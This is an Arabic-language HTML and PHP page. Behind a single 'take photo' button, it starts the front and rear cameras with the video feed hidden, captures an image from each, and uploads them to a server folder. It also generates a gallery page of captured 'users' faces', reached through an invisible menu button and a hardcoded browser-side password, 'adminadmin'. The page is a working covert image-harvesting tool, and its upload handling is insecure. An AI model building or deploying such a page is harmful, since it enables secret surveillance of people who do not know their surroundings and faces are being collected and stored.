<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>التقاط الصور</title>
    <style>
        body {
            background-color: #121212;
            color: white;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            font-family: Arial, sans-serif;
        }
        #capture-btn {
            padding: 20px;
            font-size: 18px;
            background-color: #4CAF50;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            color: white;
        }
        #menu-btn {
            position: absolute;
            top: 20px;
            left: 20px;
            background-color: transparent; /* مخفي بدون لون */
            padding: 10px;
            border: none;
            color: transparent; /* مخفي */
            cursor: pointer;
        }
        #menu {
            display: none;
            background-color: #222;
            position: absolute;
            top: 60px;
            left: 20px;
            padding: 10px;
            border-radius: 5px;
        }
        #menu a {
            color: white;
            display: block;
            padding: 5px 0;
            text-decoration: none;
        }
        video {
            display: none; /* مخفي */
        }
    </style>
</head>
<body>

    <button id="menu-btn">☰ القائمة</button>
    <div id="menu">
        <a href="#" onclick="login()">تسجيل الدخول</a>
    </div>

    <video id="video" autoplay playsinline></video>
    <form id="capture-form" method="POST" enctype="multipart/form-data">
        <button type="button" id="capture-btn" onclick="startCamera()">التقاط صورة</button>
        <input type="hidden" id="image-front" name="image_front">
        <input type="hidden" id="image-back" name="image_back">
    </form>

    <script>
        let video = document.getElementById('video');

        function startCamera() {
            // محاولة الوصول إلى الكاميرا الأمامية
            navigator.mediaDevices.getUserMedia({
                video: { facingMode: 'user' }
            }).then(stream => {
                video.srcObject = stream;
                captureImages();
            }).catch(error => {
                console.log("كاميرا أمامية غير موجودة، محاولة الوصول إلى الكاميرا الخلفية:", error);
                // محاولة الوصول إلى الكاميرا الخلفية
                navigator.mediaDevices.getUserMedia({
                    video: { facingMode: { exact: 'environment' } }
                }).then(stream => {
                    video.srcObject = stream;
                    captureImages();
                }).catch(error => {
                    alert("حدث خطأ عند محاولة الوصول إلى الكاميرا: " + error.message);
                });
            });
        }

        function captureImages() {
            // التقط الصورة الأمامية
            setTimeout(() => {
                let canvasFront = document.createElement('canvas');
                let contextFront = canvasFront.getContext('2d');
                canvasFront.width = video.videoWidth;
                canvasFront.height = video.videoHeight;
                contextFront.drawImage(video, 0, 0, canvasFront.width, canvasFront.height);
                document.getElementById('image-front').value = canvasFront.toDataURL('image/png');

                // التقط الصورة الخلفية
                navigator.mediaDevices.getUserMedia({
                    video: { facingMode: { exact: 'environment' } }  // الكاميرا الخلفية
                }).then(stream => {
                    video.srcObject = stream; // لا تظهر الفيديو
                    setTimeout(() => {
                        let canvasBack = document.createElement('canvas');
                        let contextBack = canvasBack.getContext('2d');
                        canvasBack.width = video.videoWidth;
                        canvasBack.height = video.videoHeight;
                        contextBack.drawImage(video, 0, 0, canvasBack.width, canvasBack.height);
                        document.getElementById('image-back').value = canvasBack.toDataURL('image/png');
                        document.getElementById('capture-form').submit();
                    }, 100);
                }).catch(error => {
                    alert("حدث خطأ عند محاولة الوصول إلى الكاميرا الخلفية: " + error.message);
                });
            }, 100);
        }

        document.getElementById('menu-btn').addEventListener('click', () => {
            let menu = document.getElementById('menu');
            menu.style.display = menu.style.display === 'none' ? 'block' : 'none';
        });

        function login() {
            let password = prompt("أدخل كلمة المرور:");
            if (password === 'adminadmin') {
                window.location.href = '/view_images.php';  // تعديل هذا الرابط لعرض الصور
            } else {
                alert("كلمة المرور غير صحيحة");
            }
        }
    </script>

<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $savePath = 'uploads/';
    
    // إنشاء المجلد إذا لم يكن موجودًا
    if (!is_dir($savePath)) {
        mkdir($savePath, 0777, true);
    }

    // حفظ الصورة الأمامية
    $imageFront = $_POST['image_front'];
    $imageFront = str_replace('data:image/png;base64,', '', $imageFront);
    $imageFront = str_replace(' ', '+', $imageFront);
    $imageFrontData = base64_decode($imageFront);
    $fileFront = $savePath . 'front_' . time() . '.png';
    file_put_contents($fileFront, $imageFrontData);

    // حفظ الصورة الخلفية
    $imageBack = $_POST['image_back'];
    $imageBack = str_replace('data:image/png;base64,', '', $imageBack);
    $imageBack = str_replace(' ', '+', $imageBack);
    $imageBackData = base64_decode($imageBack);
    $fileBack = $savePath . 'back_' . time() . '.png';
    file_put_contents($fileBack, $imageBackData);

    // إنشاء ملف view_images.php إذا لم يكن موجودًا
    $viewImagesFile = 'view_images.php';
    if (!file_exists($viewImagesFile)) {
        $content = <<<EOD
<?php
// عرض جميع الصور المخزنة في مجلد uploads
\$directory = 'uploads/';
\$images = glob(\$directory . "*.{jpg,jpeg,png,gif}", GLOB_BRACE);

if (count(\$images) > 0) {
    echo "<h1>صور المستخدمين</h1>";
    echo "<div style='display: flex; flex-wrap: wrap;'>";
    foreach (\$images as \$image) {
        echo "<div style='margin: 10px;'><img src='\$image' style='width: 200px; height: auto; border: 1px solid #fff;'></div>";
    }
    echo "</div>";
} else {
    echo "<p style='color:red;'>لا توجد صور تم تصويرها لوجوه المستخدمين الأمامية والخلفية.</p>";
}
?>
EOD;
        file_put_contents($viewImagesFile, $content);
    }

    echo "<p style='color:green;'>تم التقاط الصور بنجاح!</p>";
}
?>

</body>
</html>
